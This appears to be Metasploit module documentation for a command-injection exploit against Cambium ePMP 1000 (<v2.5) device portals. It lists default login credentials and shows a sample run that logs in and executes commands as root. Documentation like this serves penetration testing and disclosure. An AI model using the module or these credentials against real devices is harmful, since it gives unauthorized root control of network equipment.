This module exploits an OS Command Injection vulnerability in Cambium ePMP 1000 (<v2.5) device management portal.
It requires any one of the following login credentials to execute arbitrary system commands:

1. admin/admin
2. installer/installer
3. home/home

## Verification Steps

1. Do: ```use auxiliary/scanner/http/epmp1000_cmd_exec```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Scenarios

  ```
msf > use auxiliary/scanner/http/epmp1000_cmd_exec
msf auxiliary(epmp1000_cmd_exec) > set rhosts 1.3.3.7
msf auxiliary(epmp1000_cmd_exec) > set rport 80
msf auxiliary(epmp1000_cmd_exec) > run

[+] 1.3.3.7:80 - Running Cambium ePMP 1000 version 2.2...
[*] 1.3.3.7:80 - Attempting to login...
[+] SUCCESSFUL LOGIN - 1.3.3.7:80 - "installer":"installer"
[*] 1.3.3.7:80 - Executing id; pwd
uid=0(root) gid=0(root)
/www/cgi-bin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

  ```
